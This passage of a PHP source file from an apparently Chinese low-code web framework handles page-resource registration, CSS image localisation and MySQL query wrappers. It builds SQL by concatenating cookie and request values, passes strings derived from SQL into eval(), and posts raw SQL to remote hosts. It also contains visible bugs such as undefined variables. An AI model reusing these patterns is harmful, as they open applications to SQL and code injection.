  for ($i=0;$i<count($marr[1]);$i++){
    if (isfunc($marr[1][$i],$marr[0][$i])){
      $mfuns[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  $mfuns[$m]="anyjsshort";
  $m=$m+1;
  $mfuns[$m]="anyjstable";
  $m=$m+1;
  $mfuns[$m]="verify";
  $m=$m+1;
  $mfuns[$m]="anyshort";
  $m=$m+1;
  $mfuns[$m]="anytiny";
  $m=$m+1;
  $mfuns[$m]="anyrcv";
  $m=$m+1;
  $mfuns[$m]="anyshortnew";
  $m=$m+1;
  $mfuns[$m]="anytablenew";
  $m=$m+1;
  $mfuns[$m]="anyshortdetail";
  $m=$m+1;
  return $mfuns;
}//DESCRIB ():  END@()
function regsrc($sysid,$appid,$pagemark,$parfile,$clsa,$clsb,$srctype,$srcid){
  $srcdata="";
  if ($srcid!="" and $sysid!="" and $appid!="" and $pagemark!=""){
      if (strpos("xx".$srcid,"data:")>0){
        $srcurl=qian($srcid,"data:");
        $srcdata="data:".hou($srcid,"data:");
        $newsrcid=$srcurl.md5($srcdata);
        $srcid=$newsrcid;
        $srctype="data";
      }
    $exts=UX("select count(*) as result from coode_pagesrc where pagemark='".$pagemark."' and sourcecls='".$srctype."' and sourceid='".$srcid."'");
    if (intval($exts)==0){     
      $sqla="sysid,appid,classa,classb,pagemark,sourceid,sourcecls,OLMK,CRTM,UPTM,CRTOR,PTOF,starttime,endtime,srcdata";
      $sqlb="'".$sysid."','".$appid."','".$clsa."','".$clsb."','".$pagemark."','".$srcid."','".$srctype."','".onlymark()."',now(),now(),'".$_COOKIE["uid"]."','".$parfile."',now(),now(),'".$srcdata."'";
      $xz=UX("insert into coode_pagesrc(".$sqla.")values(".$sqlb.")");
      $sqla="sysid,appid,classa,classb,pagemark,sourceid,sourcecls,CRTM,UPTM,CRTOR,OLMK,starttime,endtime";
      $sqlb="'".$sysid."','".$appid."','".$clsa."','".$clsb."','".$pagemark."','".$srcid."','".$srctype."',now(),now(),'".$_COOKIE["uid"]."','".onlymark()."',now(),now()";
      $x=UX("insert into coode_pagefuntab(".$sqla.")values(".$sqlb.")");
     switch($srctype){
      case "tab":
      $sqla="permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,keyx,valx,dataarea,sysid,STATUS,CRTM,UPTM";
      $sqlb="'".$srcid."','".$srcid."表格新增记录','".$appid."','".$_COOKIE["cid"]."','groupid',1,'clientid','table','insert','','','DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,','".$sysid."',1,now(),now()";
      $x=UX("insert into coode_tpmtsys(".$sqla.")values(".$sqlb.")");
      $sqla="permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,keyx,valx,dataarea,sysid,STATUS,CRTM,UPTM";
      $sqlb="'".$srcid."','".$srcid."表格修改记录','".$appid."','".$_COOKIE["cid"]."','groupid',1,'clientid','table','update','','','DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,','".$sysid."',1,now(),now()";
      $x=UX("insert into coode_tpmtsys(".$sqla.")values(".$sqlb.")");
      $sqla="permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,keyx,valx,dataarea,sysid,STATUS,CRTM,UPTM";
      $sqlb="'".$srcid."','".$srcid."表格查询记录','".$appid."','".$_COOKIE["cid"]."','groupid',1,'clientid','table','select','','','DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,','".$sysid."',1,now(),now()";
      $x=UX("insert into coode_tpmtsys(".$sqla.")values(".$sqlb.")");
      $sqla="permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,keyx,valx,dataarea,sysid,STATUS,CRTM,UPTM";
      $sqlb="'".$srcid."','".$srcid."表格删除记录','".$appid."','".$_COOKIE["cid"]."','groupid',1,'clientid','table','delete','','','DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,','".$sysid."',1,now(),now()";
      $x=UX("insert into coode_tpmtsys(".$sqla.")values(".$sqlb.")");
        break;
      case "fun":
       $sqla="permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,keyx,valx,dataarea,sysid,STATUS,CRTM,UPTM";
       $sqlb="'".$srcid."','".$srcid."函数执行','".$appid."','".$_COOKIE["cid"]."','groupid',1,'clientid','function','eval','','','DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,','".$sysid."',1,now(),now()";
       $x=UX("insert into coode_fpmtsys(".$sqla.")values(".$sqlb.")");
       break;
      default:        
     }
      $zz=UX("update coode_pagesrc set srcmd5=md5(concat(sourcecls,sourceid))");
      return "1";
    }else{
      $zz=UX("update coode_pagesrc set  srcmd5=md5(concat(sourcecls,sourceid)),UPTM=now() where pagemark='".$pagemark."' and sourcecls='".$srctype."' and sourceid='".$srcid."'");
      return "0";
    }
  }else{
    return "0";
  }  
}//DESCRIB ():  END@()
function funabout($fid,$fa=array(array())){
  $frst=SX("select afffuns,affclss,afftabs from coode_funlist where funname='".str_replace("()","",$fid)."()' or funname='".str_replace("()","",$fid)."'");
  $afuns=anyvalue($frst,"afffuns",0);
  if (strpos($afuns,",")>0){
    $ptaf=explode(",",$afuns);
    for ($i=0;$i<count($ptaf);$i++){
      if ($ptaf[$i]!=""){
        $fa["fun"][$i]=$ptaf[$i];
      }
    }
  }else{
    $fa["fun"][0]=$afuns;
  }
  $aclss=anyvalue($frst,"affclss",0);
  if (strpos($aclss,",")>0){
    $ptac=explode(",",$aclss);
    for ($i=0;$i<count($ptac);$i++){
      if ($ptac[$i]!=""){
        $fa["cls"][$i]=$ptac[$i];
      }
    }
  }else{
    $fa["cls"][0]=$aclss;
  }
  $atabs=anyvalue($frst,"afftabs",0);
  if (strpos($atabs,",")>0){
    $ptat=explode(",",$atabs);
    for ($i=0;$i<count($ptat);$i++){
      if ($ptat[$i]!=""){
        $fa["tab"][$i]=$ptat[$i];
      }
    }
  }else{
    $fa["tab"][0]=$atabs;
  }
  return $fa;
}//DESCRIB ():  END@()
function tababout($tnm,$ta=array(array())){
 $frst=SX("select afffuns,affclss,afftabs from coode_tablist where TABLE_NAME='".$tnm."'");
  $afuns=anyvalue($frst,"afffuns",0);
  if (strpos($afuns,",")>0){
    $ptaf=explode(",",$afuns);
    for ($i=0;$i<count($ptaf);$i++){
      if ($ptaf[$i]!=""){
        $ta["fun"][$i]=$ptaf[$i];
      }
    }
  }else{
    $ta["fun"][0]=$afuns;
  }
  $aclss=anyvalue($frst,"affclss",0);
  if (strpos($aclss,",")>0){
    $ptac=explode(",",$aclss);
    for ($i=0;$i<count($ptac);$i++){
      if ($ptac[$i]!=""){
        $ta["cls"][$i]=$ptac[$i];
      }
    }
  }else{
    $ta["cls"][0]=$aclss;
  }
  $atabs=anyvalue($frst,"afftabs",0);
  if (strpos($atabs,",")>0){
    $ptat=explode(",",$atabs);
    for ($i=0;$i<count($ptat);$i++){
      if ($ptat[$i]!=""){
        $ta["tab"][$i]=$ptat[$i];
      }
    }
  }else{
    $ta["tab"][0]=$atabs;
  }
  return $ta;
}//DESCRIB ():  END@()
function excssfile($cssx=array(array()),$csstxt,$furl,$spath){
  $ptfurl=explode("/",$furl);
  $fname=$ptfurl[count($ptfurl)-1];
  $lslen=strlen($fname);
  $fpath=substr($furl,0,strlen($furl)-$lslen);
  $fexc=hou($furl,"//");
  $fexc=qian($fexc,"?");
  $fexc=str_replace("_","/",$fexc);
  $fexc=str_replace("-",":",$fexc);
  $tmpnum=0;
  $cssx["count"]["srcnum"]=0;
  $cssx["count"]["cssnum"]=0;
  if ($furl!="" and $spath!=""){    
         if ($csstxt==""){
           $gtcsstxt=file_get_contents($furl);
         }else{
           $gtcsstxt=$csstxt;
         };
         $oldcsstxt=$gtcsstxt;
         $ptcssa=explode("}",$gtcsstxt);
         $totptc=count($ptcssa);
         for ($b=0;$b<$totptc-1;$b++){
           $tmptou=str_replace("\r\n","@/@",qian($ptcssa[$b],"{"));
           $tmptou=hou($tmptou,"@/@");
           $tmpshen=hou($ptcssa[$b],"{");
           $ptpic=explode("url(",$tmpshen);
            $totpic=count($ptpic);
           if ($totpic>0){
             for ($p=1;$p<$totpic;$p++){
                $temppic=str_replace('"','',qian($ptpic[$p],')'));
                 $bburl=$fpath;
                if (strpos($temppic,"/")>0){
                   $tmppicnm=laststr($temppic,"/");
                }else{
                   $tmppicnm=$temppic;
                };
               if (strpos($temppic,"://")>0 or  substr($temppic,0,1)=="/" or  substr($temppic,0,2)=="//"){
                 if (substr($temppic,0,1)=="/" and substr($temppic,0,2)!="/"){ 
                   $tempurl=$temppic; //这里确定好 CSS的实际相对地址 css文件是相对他自己这个文件位置而言
                 }else{
                   $tempurl=$temppic; //这里确定好 CSS的实际相对地址 css文件是相对他自己这个文件位置而言
                 }
               }else{
                  $tempurl=connurl($bburl,$temppic); //这里确定好 CSS的实际相对地址 css文件是相对他自己这个文件位置而言
               };
               if (strpos($tempurl,"?rnd=")>0){
               }else{
                   $fexd=hou($tempurl,"//");
                   $fexd=qian($fexd,"?");
                   $fexd=str_replace("_","/",$fexd);
                   $fexd=str_replace("-",":",$fexd);
                  if (strpos("xx".$tmpurl,localroot())>0){
                       $downurl=str_replace(localroot(),"//".glw(),$tmpurl);
                  }else{
                       $downurl=$tmpurl;
                  }
                  GrabImage($downurl, combineurl($spath."images/",$fexd));
                  $gtcsstxt=str_replace($temppic,"../images/".$fexd."?rnd=".date("YmdHis"),$gtcsstxt);
                  $cssx["srcurl"][$tmpnum]=$tempurl;                 
                  $cssx["srclc"][$tmpnum]="../images/".$fexd;              
                  $cssx["srcmyurl"][$tmpnum]=$temppic;    
                  $cssx["srcpar"][$tmpnum]=$furl;
                  $tmpnum=$tmpnum+1;   
               }
             };//for
             $gtcsstxt=str_replace("@/@","\r\n",$gtcsstxt);
           };//totpic if
        };//for    
            if ($csstxt=="" and strpos($furl,".css")>0){
             overfile(combineurl($spath,"css/".$fname),$gtcsstxt);
            };
            $cssx["srctext"]["after"]=$gtcsstxt;
            $cssx["srctext"]["before"]=$oldcsstxt;
            $cssx["count"]["srcnum"]=$tmpnum-1;
           //寻找 url();图片
    $cssnum=0;    
     //@import url("fineprint.css") print;
     //@import url("bluish.css") projection, tv;
     //@import 'custom.css';
     //@import url("chrome://communicator/skin/");
     //@import "common.css" screen, projection;
     //@import url('landscape.css') screen and (orientation:landscape);
    $ptimport=explode("import ",$gtcsstxt);
    $totpti=count($ptimport);
    for ($z=1;$z<$totpti;$z++){
      if (strpos($ptimport[$z],"url")>0){
        $tmpcss=qian(hou($ptimport[$z],"("),")");
      }else{
         $tmpcss=$ptimport[$z];
      }
      $tmpcss=str_replace("\"","",$tmpcss);
      $tmpcss=str_replace("'","",$tmpcss);
      if (strpos($tmpcss,"://")>0 or substr($tmpcss,0,2)=="//"){
        $cssx["cssurl"][$tmpnum]=$tmpcss;       
      }else{
        if (substr($tmpcss,0,1)=="/"){
          $cssx["cssurl"][$tmpnum]=$tmpcss;                 
        }else{
          $cssx["cssurl"][$tmpnum]=connurl($fpath,$tmpcss);                 
        }
      }
      $cssx["csslc"][$tmpnum]=$spath."css/".excurl($tmpcss);              
      $cssx["cssmyurl"][$tmpnum]=$tmpcss;    
      $cssx["csspar"][$tmpnum]=$furl;
    }
    $cssx["count"]["cssnum"]=$totpti-1;
    return $cssx;
  }else{
    return $cssx;
  }
}//DESCRIB ():  END@()
function regfile($sysid,$appid,$clsa,$clsb,$pmk,$parfile,$fullurl,$myurl,$lcurl){
     if ($fullurl!="" and $sysid!="" and $appid!="" and $pmk!=""){
      if (strpos("xx".$fullurl,"data:")>0){
        $srcurl=qian($fullurl,"data:");
        $srcdata="data:".hou($fullurl,"data:");
        $newsrcid=$srcurl.md5($srcdata);
        $fullurl=$newsrcid;
        if (strpos($fullurl,"image/gif")){
          $exf="gif";
        }
        if (strpos($fullurl,"image/png")){
          $exf="png";
        }
        if (strpos($fullurl,"image/jpg")){
          $exf="jpg";
        }
      }
        $extsrc=UX("select count(*) as result from coode_pagesrc where pagemark='".$pmk."' and sourceid='".$fullurl."'");
       if (intval($extsrc)==0){
           $sqla="sysid,appid,classa,classb,pagemark,sourceid,sourcecls,OLMK,CRTM,UPTM,CRTOR,PTOF,starttime,endtime,srcdata";
           $sqlb="'".$sysid."','".$appid."','".$clsa."','".$clsb."','".$pmk."','".$fullurl."','file','".onlymark()."',now(),now(),'".$_COOKIE["uid"]."','".$parfile."',now(),now(),'".$srcdata."'";
           $xz=UX("insert into coode_pagesrc(".$sqla.")values(".$sqlb.")");
               $extn=UX("select count(*) as result from coode_pagefile where sysid='".$sysid."' and fileurl='".$fullurl."'");
             if (intval($extn)>0){
                $xz=UX("update coode_pagefile set UPTM=now() where sysid='".$sysid."' and pagemark='".$pmk."' and fileurl='".$fullurl."'");
             }else{
               if (strpos("xx".$fullurl,"data:")>0){
                $pfile=md5($srcdata);
                $sqla="pagemark,filename,filecname,parfpath,filepath,filetype,pagesrc,fileurl,filelocal,OLMK,CRTM,UPTM,sysid,appid,picb64";
                $sqlb="'".$pmk."','".$pfile."','".$pfile."','".$parfile."','','".$exf."','".$pfile."','".$fullurl."','".$pfile."','".onlymark()."',now(),now(),'".$sysid."','".$appid."','".$srcdata."'";
                $xy=UX("insert into coode_pagefile(".$sqla.")values(".$sqlb.")");
               }else{
                $ptpf=explode("/",$fullurl);
                $totpf=count($ptpf);
                $pfile=qian($ptpf[$totpf-1],"?");
                $pturl=explode(".",$fullurl);
                $totp=count($pturl);
                $exf=qian($pturl[$totp-1],"?");
                $sqla="pagemark,filename,filecname,parfpath,filepath,filetype,pagesrc,fileurl,filelocal,OLMK,CRTM,UPTM,sysid,appid";
                $sqlb="'".$pmk."','".$pfile."','".$pfile."','".$parfile."','','".$exf."','".$myurl."','".$fullurl."','".$lcurl."','".onlymark()."',now(),now(),'".$sysid."','".$appid."'";
                $xy=UX("insert into coode_pagefile(".$sqla.")values(".$sqlb.")");
               }
             }
            return "1";
       }else{
                $xx=UX("update coode_pagesrc set UPTM=now() where pagemark='".$pmk."' and sourceid='".$fullurl."'");
                $xz=UX("update coode_pagefile set UPTM=now() where sysid='".$sysid."' and fileurl='".$fullurl."'");
         return "0";
       }
     }else{
       return "0";
     }
}//DESCRIB ():  END@()
function relinksrc($tinymk,$lexp,$sysid,$appid){
 if (strpos($lexp,"stid=")>0){
     $shortid=qian(qian(hou($lexp,"stid="),"&"),"-");
     $indexpath=combineurl(localroot(),"/DEVELOPING/".$sysid."/".$appid."/shortid/".$shortid);     
     $indexjspath=combineurl(localroot(),"/DEVELOPING/".$sysid."/".$appid."/shortid/".$shortid."/js");     
     $indexcsspath=combineurl(localroot(),"/DEVELOPING/".$sysid."/".$appid."/shortid/".$shortid."/css");     
     $indeximagespath=combineurl(localroot(),"/DEVELOPING/".$sysid."/".$appid."/shortid/".$shortid."/images");     
 }else{
     $indexpath=combineurl(localroot(),"/DEVELOPING/".$sysid."/".$appid."/pagemark/".$tinymk);          
     $indexjspath=combineurl(localroot(),"/DEVELOPING/".$sysid."/".$appid."/pagemark/".$tinymk."/js");     
     $indexcsspath=combineurl(localroot(),"/DEVELOPING/".$sysid."/".$appid."/pagemark/".$tinymk."/css");     
     $indeximagespath=combineurl(localroot(),"/DEVELOPING/".$sysid."/".$appid."/pagemark/".$tinymk."/images");
 }
  $allrst=SX("select filelocal from coode_pagefile where sysid='".$sysid."' and pagemark='".$tinymk."' and timestampdiff(second,UPTM,now())>1200");//这里与下面的时间都不能少
  $tot=countresult($allrst);
  for ($i=0;$i<$tot;$i++){
    $tmpfile=anyvalue($allrst,"filelocal",$i);
    $tmpfile=str_replace("","../",$tmpfile);
    $longpath=combineurl($indexpath,$tmpfile);
    unlink($longpath);
  }
  $k=UX("delete from coode_pagesrc where sysid='".$sysid."' and pagemark='".$tinymk."' and timestampdiff(second,UPTM,now())>1200");//超过二十分钟的未更新的要删除 列表和详情怎么区分呢，列表和详情必须在短时间内同时audic 审核资源
  $kx=UX("delete from coode_pagefile where sysid='".$sysid."' and pagemark='".$tinymk."' and timestampdiff(second,UPTM,now())>1200");//超过二十分钟的未更新的要删除  详情和列表必须在20分钟内同时更新
  return true;
}//DESCRIB ():  END@()

function check_wap(){
    // 先检查是否为wap代理，准确度高
    if(stristr($_SERVER['HTTP_VIA'],"wap")){
            return true;
        }
        // 检查浏览器是否接受 WML.
        elseif(strpos(strtoupper($_SERVER['HTTP_ACCEPT']),"VND.WAP.WML") > 0){
        return true;
   }
   //检查USER_AGENT
   elseif(preg_match('/(blackberry|configuration\/cldc|hp |hp-|htc |htc_|htc-|iemobile|kindle|midp|mmp|motorola|mobile|nokia|opera mini|opera |Googlebot-Mobile|YahooSeeker\/M1A1-R2D2|android|iphone|ipod|mobi|palm|palmos|pocket|portalmmm|ppc;|smartphone|sonyericsson|sqh|spv|symbian|treo|up.browser|up.link|vodafone|windows ce|xda |xda_)/i', $_SERVER['HTTP_USER_AGENT'])){
        return true;           
    }
    else{
        return false;  
   }
}//DESCRIB ():  END@()
//-----------------------------connect结束
function updating($con,$db,$sqlstr){
//mysql_select_db($db, $con);
$con -> query("set names 'utf8'"); //数据库输出编码 
$con -> select_db($db); //打开数据库
$result = $con->query($sqlstr); //查询成功
//$result = mysql_query($sqlstr);
 if (strpos($sqlstr,"result")>0)
  {
  if ($result){
    while($row = mysqli_fetch_array($result))
    {
     mysqli_close($con);
     return empty($row["result"])?"":$row["result"];
    }
  }else{
    $sqlerror=mysqli_error($con);
     mysqli_close($con);
    return "failure:SE-".$sqlerror."@".$sqlstr;
  }
 }else
 {
   mysqli_close($con);
   return $result?1:0;
  }; 
}//DESCRIB ():  END@()

function updatingx($con,$db,$sqlstr,$lan){
 //mysql_select_db($db, $con);
 //mysql_query("SET NAMES ".$lan);    
 if (gettype($con)=="object" and $con){
 $con -> query("set names '".$lan."'"); //数据库输出编码
 $con -> select_db($db); //打开数据库
 $result = $con->query($sqlstr); //查询成功
//$result = mysql_query($sqlstr);
  if (strpos($sqlstr,"result")>0){
   if ($result){
      while($row = mysqli_fetch_array($result))
      {
        mysqli_close($con);
        return empty($row["result"])?"":$row["result"];
      }
   }else{
     $sqlerror=mysqli_error($con);
     mysqli_close($con);  
     return "failure:SE-".$sqlerror."@".$sqlstr;
   }
  }else{
   mysqli_close($con);
   return $result?1:0;
  };
 }else{
  if (gettype($con)=="object"){
   return "failure:SE-".mysqli_error();
  }else{
  //远程
   $purl="http://".$con["host"]."/DNA/EXF/anyfuns.php?fid=updatingx&db=".$db."&uid=".glr();
   $pdata=array();
   $pdata["sqlstr"]=$sqlstr;
   return request_post($purl,$pdata);
  }
 } 
}//DESCRIB ():  END@()

function selecting($con,$db,$sqlstr,$lan){
 $formrt="";
 $partsql=get_between($sqlstr,"elect "," from");
 $partk=explode(",",$partsql);
 $totkey=count($partk);
 //mysql_select_db($db, $con);
 //mysql_query("SET NAMES ".$lan); 
 //$result = mysql_query($sqlstr);
 $con -> query("set names '".$lan."'"); //数据库输出编码 
 $con -> select_db($db); //打开数据库
 $result = $con->query($sqlstr); //查询成功
  for ($x=0;$x<=$totkey-1;$x++)
  {
   if ($x<$totkey-1)
    {
     $formrt=$formrt.str_replace(" ","",$partk[$x])."#-#";
    }
   else
   {
    $formrt=$formrt.str_replace(" ","",$partk[$x]);
    };
 };
$formrt=$formrt."#/#";
while($row = mysqli_fetch_array($result))
  {
   for ($x=0;$x<=$totkey-1;$x++)
   {
    if ($x<$totkey-1)
     {
      $formrt=$formrt.$row[$partk[$x]]."#-#";
     }
     else
     {
      $formrt=$formrt.$row[$partk[$x]];
      };
   };
  $formrt=$formrt."#/#";
  };
 mysqli_close($con);
 return $formrt;
}//DESCRIB ():  END@()
function selected($con,$db,$sqlstr,$way){
 $formrt="";
 $partsql=get_between($sqlstr,"elect "," from");
 $partk=explode(",",$partsql);
 $totkey=count($partk);
 //mysql_select_db($db, $con);
 //mysql_query("SET NAMES GB2312"); 
 //$result = mysql_query($sqlstr);
  $con -> query("set names '".$lan."'"); //数据库输出编码
  $con -> select_db($db); //打开数据库
  $result = $con->query($sqlstr); //查询成功  
 for ($x=0;$x<=$totkey-1;$x++)
  {
   if ($x<$totkey-1)
    {
     $formrt=$formrt.str_replace(" ","",$partk[$x])."#-#";
    }
   else
   {
    $formrt=$formrt.str_replace(" ","",$partk[$x]);
    };
 };
$formrt=$formrt."#/#";
while($row = mysqli_fetch_array($result))
  {
   for ($x=0;$x<=$totkey-1;$x++)
   {
    if ($x<$totkey-1)
     {
      $formrt=$formrt.$row[$partk[$x]]."#-#";
     }
     else
     {
      $formrt=$formrt.$row[$partk[$x]];
      };
   };
  $formrt=$formrt."#/#";
  };
 mysqli_close($con);
 return $formrt;
 }//DESCRIB ():  END@()
function selectedx($con,$db,$sqlstr,$lan,$way){
 $formrt="";
 if (gettype($con)=="object" and $con){
  if ($sqlstr!=""){
    if (strpos($sqlstr,"elect")>0 and strpos($sqlstr,"from")>0){
     $partsql=get_between($sqlstr,"elect "," from");
    }
    if (strpos($sqlstr,"ELECT")>0 and strpos($sqlstr,"FROM")>0){
     $partsql=get_between($sqlstr,"ELECT "," FROM");
    }
   $partk=explode(",",$partsql);
   $totkey=count($partk);
   //mysql_select_db($db, $con);
   //mysql_query("SET NAMES ".$lan); 
   //$result = mysql_query($sqlstr);
   $con -> query("set names '".$lan."'"); //数据库输出编码 
   $con -> select_db($db); //打开数据库
   $result = $con->query($sqlstr); //查询成功
  for ($x=0;$x<=$totkey-1;$x++)
   {
    if ($x<$totkey-1)
     {
      $formrt=$formrt.str_replace(" ","",str_replace(" ","",hou(hou($partk[$x],".")," as ")))."#-#";
     }
    else
    {
     $formrt=$formrt.str_replace(" ","",str_replace(" ","",hou(hou($partk[$x],".")," as ")));
     };
   };
   $formrt=$formrt."#/#";
   if (!$result){
     $sqlerror=mysqli_error($con);
      mysqli_close($con);
     return $formrt."数据库报错#-#SE: ".$sqlerror ."#-#".$sqlstr."#-#".date("Y-m-d H:i:s")."#-#".$db."#-#".$lan."#/#";    
     exit();
   }else{
    while($row = mysqli_fetch_array($result))
    {
     for ($x=0;$x<=$totkey-1;$x++)
     {
      if ($x<$totkey-1)
      {
       $formrt=$formrt.$row[str_replace(" ","",hou(hou($partk[$x],".")," as "))]."#-#";
      }
      else
      {
       $formrt=$formrt.$row[str_replace(" ","",hou(hou($partk[$x],".")," as "))];
       };
      };
      $formrt=$formrt."#/#";
     };         
   } 
     if ($way=='arr' ){
       mysqli_close($con);
       return mysql_fetch_array($result);   
     }
   else{
     mysqli_close($con);
     return $formrt;   
   };
  }else{
   return "";
  }
 }else{
  if (gettype($con)=="object"){
   return "failure:SE-".mysqli_error();
  }else{
  //远程
   $purl="http://".$con["host"]."/DNA/EXF/anyfuns.php?fid=selectedx&db=".$db."&uid=".glr();
   $pdata=array();
   $pdata["sqlstr"]=$sqlstr;
   return request_post($purl,$pdata);
  }
 }
}//DESCRIB ():  END@()

function exshort($shortid,$pagex,$pagenum,$pagekey,$datakey){  
    $databk=anyshort($shortid,$pagex,$pagenum);
    $ptpk=explode(",",$pagekey);
    $ptdk=explode(",",$datakey);
    $totp=count($ptpk);
    for ($i=0;$i<$totp;$i++){
      $databk=str_replace("\"".$ptdk[$i]."\"","\"".$ptpk[$i]."\"",$databk);
    } 
  $databk=str_replace("\"false\"","false",$databk);
  $databk=str_replace("\"true\"","true",$databk);
  $databk=str_replace("\"varchar\"","\"string\"",$databk);
  $databk=str_replace("\"tinyint\"","\"int\"",$databk);
  $databk=str_replace("\"text\"","\"string\"",$databk);
  return $databk;
}//DESCRIB ():  END@()

function updatings($con,$fb,$sqlx,$lag){
  $fmwhere="";
if (strpos("x".$sqlx,"select")>0 or strpos("x".$sqlx,"update")>0 or strpos("x".$sqlx,"insert")>0  or strpos("x".$sqlx,"delete")>0){
   $ddrst=updatingx($con,$fb,$sqlx,$lag);
}else{
  $_GET["UPDTSTR"]=_get("UPDTSTR");
 if (strpos("xxx".$_GET["UPDTSTR"],$fb.$sqlx)>0){
   $ddrst="failure:die to repeat in ".$fb."-running_".$sqlx;
 }else{
  if (strpos("x".$sqlx,"UPDATE ")>0 and strpos("x".$sqlx," SET ")>0 ){
  //发现修改 先检查是否真的变动了，如果没有变动则跳过不然后边有好多访问数据请求浪费时间  
    $gsno=hou($sqlx,"SNO=");
    $gsno=str_replace(" ","",$gsno);
    $gsno=str_replace(")","",$gsno);
    $gsno=str_replace("'","",$gsno);
    $_GET["SNO"]=$gsno;
    $_GET["tbnm"]=qian(hou($sqlx,"UPDATE ")," SET ");
    $_GET["tbnm"]=str_replace(" ","",$_GET["tbnm"]);
    $sqlstr=qian(hou($sqlx," SET ")," WHERE ");
    $cstj=hou($sqlx," WHERE ");
    //用这个判断就可以
    $ptsql=explode(",",$sqlstr);
    $totp=count($ptsql);
    $fmallkx="";
    $evx="";
   // echo "SNO=".$gsno;
  if ($totp>0 and $sqlstr!=""){
    for ($z=0;$z<$totp;$z++){
      $pppx=$ptsql[$z];
      $tkkk=qian($pppx,"=");
      $tvvv=hou($pppx,"=");
      $fmallkx=$fmallkx.$tkkk.",";
      if (substr($tvvv,0,1)=="'" or substr($tvvv,-1)=="'"){
        $evx='$_POST[\'p_'.$tkkk.$gsno.'\']='.$tvvv.';';
        $fmwhere=$fmwhere." and ".$ptsql[$z];
      }else{
        $tvvv="'".$tvvv."'";
        $evx='$_POST[\'p_'.$tkkk.$gsno.'\']='.$tvvv.';';
        $fmwhere=$fmwhere." and ".$ptsql[$z];
      }
     // echo $evx."---";
      eval($evx);      
    }//for    //单个接受字段里如果有,逗号会被分割
  //  echo $fmwhere."--";
  }else{//totp!>0
      $pppx=$sqlstr;
      $tkkk=qian($pppx,"=");
      $tvvv=hou($pppx,"=");
      $fmallkx=$fmallkx.$tkkk.",";
      if (substr($tvvv,0,1)=="'" or substr($tvvv,-1)=="'"){
        $evx='$_POST[\'p_'.$tkkk.$gsno.'\']='.$tvvv.';';
        $fmwhere=$fmwhere." and ".$ptsql[$z];
      }else{
        $tvvv="'".$tvvv."'";
        $evx='$_POST[\'p_'.$tkkk.$gsno.'\']='.$tvvv.';';
        $fmwhere=$fmwhere." and ".$ptsql[$z];
      }
     // echo $evx."---";
      eval($evx);      
    };//if    
    $fmwhere=$cstj.$fmwhere;
    $fmallkx=substr($fmallkx,0,strlen($fmallkx)-1);  
    $_GET["kies"]=$fmallkx;
    $_GET["kies"]=str_replace(" ","",$_GET["kies"]);
   //$frst=anyfunrun("anyrcv",$_GET["appid"],"");
  }else{//update
   if (strpos("x".$sqlx,"INSERT ")>0 and strpos("x".$sqlx," INTO ")>0){
    //发现新增
    $_GET["SNO"]="0";
    $_GET["tbnm"]=qian(hou($sqlx,"INTO "),"(");
    $_GET["tbnm"]=str_replace(" ","",$_GET["tbnm"]);
    $_GET["kies"]=qian(hou($sqlx,$_GET["tbnm"]."("),")VALUES");
    $_GET["kies"]=str_replace(" ","",$_GET["kies"]);
    $allkx=$_GET["kies"];
    $allvx=hou($sqlx,"VALUES(");
    $allvx=substr($allvx,0,strlen($allvx)-1);
    //为什么只用一个HOU因为后面的括号有可能是值所以一个括号容易出错
    $ptkx=explode(",",$allkx);
    $ptvx=explode(",",$allvx);
    $totp=count($ptkx);
    $evx="";
    if ($totp>0 and $allvx!=""){
     for ($z=0;$z<$totp;$z++){
      if (substr($ptvx[$z],0,1)=="'"){
        $evx='$_POST[\'p_'.$ptkx[$z].'0\']='.$ptvx[$z].';';
      }else{
        $ptvx[$z]="'".$ptvx[$z]."'";
        $evx='$_POST[\'p_'.$ptkx[$z].'0\']='.$ptvx[$z].';';
      }
      eval($evx);      
     }
    }
  }else{//insert
    //未发现 则执行查询
    if (strpos("x".$sqlx,"DELETE ")>0 and strpos("x".$sqlx," FROM ")>0){
       $_GET["tbnm"]=qian(hou($sqlx,"FROM ")," WHERE ");       
       $_GET["kies"]="-killitem";
       $gcdt=hou($sqlx,"where ");
       if ($gsno!=""){
         $gcdt=" SNO=".$gsno;
       }else{
         if ($golmk!=""){
           $gcdt=" OLMK='".$golmk."'";
         }else{
         }
       }
      $gcdt=str_replace(" ","",$gcdt);
      if (strpos($gcdt,"=")>0 or strpos($gcdt,"like")>0){       
        $_GET["killcdt"]=$gcdt;
      }else{
        $_GET["killcdt"]="";
      }
    }else{   //delete  
    }//delete
   }//insert 
  }  //update
  
    if ($_GET["UPDTSTR"]==""){//这个判断防止死循环
      $_GET["UPDTSTR"]=$fb.$sqlx;
    }else{
      $_GET["UPDTSTR"]=$_GET["UPDTSTR"]."/".$fb.$sqlx;
    }
    if ($fmwhere==""){
     $ddrst=makercv();
    }else{
      $conn=mysql_connect(gl(),glu(),glp());
      $dontchange=updatingx($conn,glb(),"select count(*) as result from ".$_GET["tbnm"]." where ".$fmwhere,"utf8");
      if ($dontchange*1>0){//没变一样，就不执行makercv 不然太耗时间
        //$ddrst=updatingx($con,$fb,$sqlx,$lag); 啥也不执行
        echo "select count(*) as result from ".$_GET["tbnm"]." where ".$fmwhere;
      }else{
        $ddrst=makercv();
      }
    }
  }
 }//防止死循环 
 return $ddrst;
}//DESCRIB ():  END@()
function editacc($editname,$editstr){
  if ($editname=="anyfile"){
    $extx=UX("select count(*) as result from coode_afspace where askforstr='".$editstr."' and askforwhat='".$editname."' and accstt=1 and etel='".$_COOKIE["uid"]."'");
  }else{
    $extx=UX("select count(*) as result from coode_afspace where (fromurl='".$editstr."' or fromurl='".$editstr."()') and askforwhat='".$editname."' and accstt=1 and etel='".$_COOKIE["uid"]."'");    
  }
  if (intval($extx)>0){
    return true;
  }else{
    return false;
  }
